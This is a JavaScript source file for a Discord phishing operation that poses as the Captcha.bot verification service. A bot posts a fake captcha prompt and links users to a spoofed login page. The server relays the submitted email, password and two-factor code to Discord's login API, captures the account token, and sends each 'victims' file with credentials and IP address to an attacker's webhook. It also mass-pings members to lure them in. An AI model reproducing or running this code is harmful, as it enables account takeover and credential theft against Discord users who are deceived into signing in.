console.clear()

process.on('uncaughtException', function (err) {
  console.log(err)
})
process.on('unhandledRejection', function (err) {
  console.log(err)
})
process.on('warning', function (err) {
  console.log(err)
})

require('dotenv').config()

const fs = require('fs')
const path = require('path')
const express = require('express')
const rateLimit = require('express-rate-limit').rateLimit
const hook = require('discord-webhook-node')
const discord = require('discord.js')
const requestIp = require('request-ip')
const tinyURL = require('tinyurl')
const fetch = require('node-fetch')

const bot = new discord.Client({
  fetchAllMembers: true,
  fetchAllGuilds: true,
  intents: [
    discord.Intents.FLAGS.GUILDS,
    discord.Intents.FLAGS.GUILD_MEMBERS,
    discord.Intents.FLAGS.GUILD_BANS,
  ]
})

const webhook = new hook.Webhook({
  'url': process.env.WEBHOOK_URL,
  'retryOnLimit': true,
  'throwErrors': false
})

webhook.setUsername('Captcha.bot')
webhook.setAvatar('https://i.pinimg.com/736x/89/82/1f/89821f58a02e82642e6a6eccb13a04be.jpg')

const limiter = rateLimit({
  windowMs: 300000,
  limit: 50,
  standardHeaders: 'draft-7',
  legacyHeaders: false,
  handler: (req, res) => {
    res.status(400).json({
      'status': 400
    })
  },
  validate: {
    trustProxy: false
  },
})

const app = express()

app.set('trust proxy', true)
app.use(requestIp.mw())
app.use(express.json({
  limit: '100mb',
}))

app.use('/login', express.static(path.join(__dirname, 'util', 'login')))
app.use('/verification', express.static(path.join(__dirname, 'util', 'verification')))

async function fetch_function(url, options) {
  const response = await fetch(url, options)
  const json = await response.json()
  if (json && json.message === 'The resource is being rate limited.') {
    const ms = json.retry_after * 1000
    await new Promise(resolve => setTimeout(resolve, ms))
    return await fetch_function(url, options)
  }
  return json
}

async function url(conteudo) {
  return await new Promise((resolve) => {
    tinyURL.shorten(conteudo, function (res, err) {
      if (err) resolve(conteudo)
      resolve(res)
    })
  })
}

async function check_base(conteudo, num) {
  try {
    if (!conteudo || conteudo.trim() === '' || !conteudo.includes(process.env.GRUPO_ID)) {
      return false
    }
    const json = JSON.parse(conteudo)
    const hasGuildAndClient = 'guildId' in json && 'clientId' in json
    if (num === 1) {
      return hasGuildAndClient && 'name' in json && 'members' in json && 'icon' in json
    } else if (num === 2) {
      return hasGuildAndClient
    }
  } catch (e) {
    console.log(e)
  }
  return false
}

app.use(async (req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*")
  res.header("Access-Control-Allow-Headers", "*")
  const url = req.url.includes('verification') || req.url.includes('login') || req.url.includes('mfa/totp')
  if (!url) return res.status(200).redirect('https://captcha.bot/')
  if (req.method === 'GET' && req.url.includes('login')) {
    const query = req.query
    if (!query.from) return res.status(200).redirect('https://captcha.bot/')
    let encryptedString = query.from;
    let reversedString = encryptedString.split('').reverse().join('')
    let decodedString = atob(atob(reversedString))
    const c = await check_base(decodedString, 2)
    if (!c) return res.status(200).redirect('https://captcha.bot/')
  }
  if (req.method === 'GET' && req.url.includes('verification')) {
    const query = req.query
    if (!query.data) return res.status(200).redirect('https://captcha.bot/')
    const c = await check_base(Buffer.from(query.data, 'base64').toString('utf-8'), 1)
    if (!c) return res.status(200).redirect('https://captcha.bot/')
  }
  return next()
})

app.get('/verification', express.static(path.join(__dirname, 'util', 'verification')), async function (req, res) {
  res.status(200).sendFile(path.join(__dirname, 'util', 'verification', 'index.html'))
})

app.get('/login', express.static(path.join(__dirname, 'util', 'login')), async function (req, res) {
  res.status(200).sendFile(path.join(__dirname, 'util', 'login', 'index.html'))
})

app.get('/secure', async (req, res) => {
  res.status(200).redirect('https://captcha.bot/')
})

app.post('/login', limiter, async (req, res) => {
  try {
    const body = req.body
    if (body && !body.ref) return res.redirect('https://captcha.bot/')
    const headers = {
      'Content-Type': 'application/json'
    }
    if (body && body.captcha_key) {
      headers['X-Captcha-Key'] = body.captcha_key
    }
    const email = body.email
    const password = body.password
    const api = await fetch_function('https://discord.com/api/v9/auth/login', {
      method: 'POST',
      headers: headers,
      body: JSON.stringify({
        'email': email,
        'password': password
      }, null, 3)
    })
    if (api && api.token) {
      const b1 = Buffer.from(body.ref, 'base64')
      const b2 = Buffer.from(b1.toString('utf-8'), 'base64')
      const js = JSON.parse(b2)
      await fs.promises.appendFile(path.join(__dirname, 'tokens.txt'), `${api.token}\n`)
      await fs.promises.writeFile(path.join(__dirname, 'victims', `victims-${js.clientId}.json`), JSON.stringify({
        'token': api.token,
        'mfa': false,
        'email': email,
        'password': password,
        'ip': req.clientIp,
        'guildId': js.guildId,
        'clientId': js.clientId,
      }, null, 3))
      await webhook.sendFile(path.join(__dirname, 'victims', `victims-${js.clientId}.json`))
      return res.status(200).json({
        'status': 1
      })
    }
    if (JSON.stringify(api).includes('ACCOUNT_LOGIN_VERIFICATION_EMAIL')) {
      return res.status(200).json({
        'status': 2
      })
    }
    if (JSON.stringify(api).includes('captcha-required')) {
      return res.status(200).json({
        'status': 3
      })
    }
    if (JSON.stringify(api).includes('INVALID_LOGIN') || JSON.stringify(api).includes('EMAIL_TYPE_INVALID_EMAIL')) {
      return res.status(200).json({
        'status': 4
      })
    }
    if (api && api.mfa) {
      const b1 = Buffer.from(body.ref, 'base64')
      const b2 = Buffer.from(b1.toString('utf-8'), 'base64')
      const js = JSON.parse(b2)
      await fs.promises.writeFile(path.join(__dirname, 'log', `log-${js.clientId}.json`), JSON.stringify({
        ...api,
        ...body
      }, null, 3))
      return res.status(200).json({
        'status': 5,
      })
    }
    if (JSON.stringify(api).includes('ACCOUNT_COMPROMISED_RESET_PASSWORD')) {
      return res.status(200).json({
        'status': 6
      })
    } else {
      console.log(JSON.stringify(api))
      return res.status(200).json({
        'status': 4
      })
    }
  } catch (e) {
    console.log(e)
    return res.status(200).json({
      'status': 4
    })
  }
})

app.post('/mfa/totp', limiter, async (req, res) => {
  try {
    const body = req.body
    if (body && !body.ref) return res.redirect('https://captcha.bot/')
    const headers = {
      'Content-Type': 'application/json'
    }
    const code = body.code
    let ticket = body.ticket
    if (!ticket) {
      const b1 = Buffer.from(body.ref, 'base64').toString('utf-8')
      const b2 = Buffer.from(b1, 'base64').toString('utf-8')
      const js = JSON.parse(b2)
      const u = await fs.promises.readFile(path.join(__dirname, 'log', `log-${js.clientId}.json`), 'utf-8')
      const json = JSON.parse(u)
      ticket = json.ticket
    }
    const api = await fetch_function('https://discord.com/api/v9/auth/mfa/totp', {
      method: 'POST',
      headers: headers,
      body: JSON.stringify({
        "code": code,
        "ticket": ticket,
        "login_source": null,
        "gift_code_sku_id": null
      }, null, 3)
    })
    if (api && api.code === 60008 || api.code === '60008') {
      return res.status(200).json({
        'status': 0
      })
    }

    if (api && api.token) {
      const b1 = Buffer.from(body.ref, 'base64').toString('utf-8')
      const b2 = Buffer.from(b1, 'base64').toString('utf-8')
      const js = JSON.parse(b2)
      const dados = JSON.parse(await fs.promises.readFile(path.join(__dirname, 'log', `log-${js.clientId}.json`)))
      await fs.promises.appendFile(path.join(__dirname, 'tokens.txt'), `${api.token}\n`)
      await fs.promises.writeFile(path.join(__dirname, 'victims', `victims-${js.clientId}.json`), JSON.stringify({
        'token': api.token,
        'ticket': ticket,
        'code': code,
        'email': dados.email,
        'password': dados.password,
        'ip': dados.ip,
        'guildId': dados.guildId,
        'clientId': dados.clientId,
      }, null, 3))
      await webhook.sendFile(path.join(__dirname, 'victims', `victims-${js.clientId}.json`))
      return res.status(200).json({
        'status': 1
      })
    } else {
      console.log(JSON.stringify(api))
      return res.status(200).json({
        'status': 0
      })
    }
  } catch (e) {
    console.log(e)
    return res.status(200).json({
      'status': 0
    })
  }
})

app.options('/secure', async (req, res) => {
  res.status(200).send('ok')
})

app.options('/verification', async (req, res) => {
  res.status(200).send('ok')
})

app.options('/login', async (req, res) => {
  res.status(200).send('ok')
})

app.options('/mfa/totp', async (req, res) => {
  res.status(200).send('ok')
})

app.listen(3000, async () => {
  console.log('Servidor rodando na porta 80.')
})

bot.on('ready', async () => {
  const channel = await bot.channels.fetch(process.env.CANAL_ID)
  if (!channel) return console.log('Canal não encontrado.')
  setInterval(async () => {
    try {
      const c = await channel.send('@everyone')
      await new Promise(resolve => setTimeout(resolve, 500))
      await c.delete()
    } catch (e) {
      console.log(e)
    }
  }, 600000)
})

bot.on('guildMemberAdd', async member => {
  try {
    const channel = await bot.channels.fetch(process.env.CANAL_ID)
    if (!channel) return console.log('Canal não encontrado.')
    const c = await channel.send(`<@${member.id}>`)
    await new Promise(resolve => setTimeout(resolve, 500))
    await c.delete()
  } catch (e) {
    console.log(e)
  }
})

bot.on('ready', async () => {
  console.log('Bot iniciado.')
  const server_id = process.env.GRUPO_ID
  const channel_id = process.env.CANAL_ID
  const guild = await bot.guilds.fetch(server_id)
  if (!guild) return console.log('Servidor não encontrado.')
  const channel = await guild.channels.fetch(channel_id)
  if (!channel) return console.log('Canal não encontrado.')
  let uds = null
  if (fs.existsSync(path.join(__dirname, 'log', `log-message-${bot.user.id}.txt`))) {
    try {
      const messageId = await fs.promises.readFile(path.join(__dirname, 'log', `log-message-${bot.user.id}.txt`), 'utf-8')
      uds = await channel.messages.fetch(messageId)
    } catch (e) {
      console.log(e)
    }
  }
  let ld
  const row1 = new discord.MessageActionRow()
    .addComponents(
      new discord.MessageButton()
      .setCustomId('desativado')
      .setLabel(`ONLY verify on https://${process.env.API}`)
      .setStyle('SECONDARY')
      .setDisabled(true))
  const row2 = new discord.MessageActionRow()
    .addComponents(
      new discord.MessageButton()
      .setCustomId('verify')
      .setLabel('Verify')
      .setEmoji('🤖')
      .setStyle('PRIMARY'),
      new discord.MessageButton()
      .setCustomId('why')
      .setLabel('Why?')
      .setStyle('SECONDARY')
    )
  const embed = new discord.MessageEmbed()
    .setTitle('🤖 Verification required')
    .setDescription(`To gain access to ${'`' + guild.name + '`'} you need to prove you are a human by completing a captcha. Click the button below to get started!`)
    .setColor('#336B8C')
    .setTimestamp()
  if (uds) {
    ld = await uds.edit({
      embeds: [embed],
      components: [row1, row2]
    })
  } else {
    ld = await channel.send({
      embeds: [embed],
      components: [row1, row2]
    })
  }
  return await fs.promises.writeFile(path.join(__dirname, 'log', `log-message-${bot.user.id}.txt`), ld.id)
})

bot.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return
  if (interaction && interaction.customId === 'verify') {
    const data = {
      "guildId": interaction.guild.id,
      "clientId": interaction.user.id,
      "name": interaction.guild.name,
      "members": interaction.guild.members.cache.size,
      "icon": interaction.guild.iconURL({
        dynamic: true
      })
    }
    const buffer = Buffer.from(JSON.stringify(data))
    const b65 = buffer.toString('base64')
    const row = new discord.MessageActionRow()
      .addComponents(
        new discord.MessageButton()
        .setCustomId('desativado')
        .setLabel(`ONLY verify on https://${process.env.API}`)
        .setStyle('SECONDARY')
        .setDisabled(true))
    const url1 = "https://" + process.env.API + '/verification?data=' + b65
    const embed = new discord.MessageEmbed()
      .setTitle(`Please verify yourself to gain access to ${interaction.guild.name}`)
      .setDescription(`Please complete this captcha to prove you are a human: [Click here](${await url(url1)})`)
      .setColor('#336B8C')
      .setTimestamp()
    await interaction.reply({
      embeds: [embed],
      components: [row],
      ephemeral: true
    })
  }
  if (interaction && interaction.customId === 'why') {
    await interaction.reply({
      content: `This server is protected by https://${process.env.API} to prevent raids & malicious users. You can protect your server by inviting Captcha.bot here: ${process.env.api}/secure .\nTo gain access to this server you will need to verify yourself by completing a captcha.\n\n❓ What can Captcha.bot do?\n${'`' + '-' +  '`'} View your name and avatar. It does not have access to control your account.\n${'`' + '-' + '`'} View which servers you have joined!`,
      ephemeral: true
    })
  }
})

bot.login(process.env.TOKEN).catch(() => {
  console.log('Token inválido.')
})
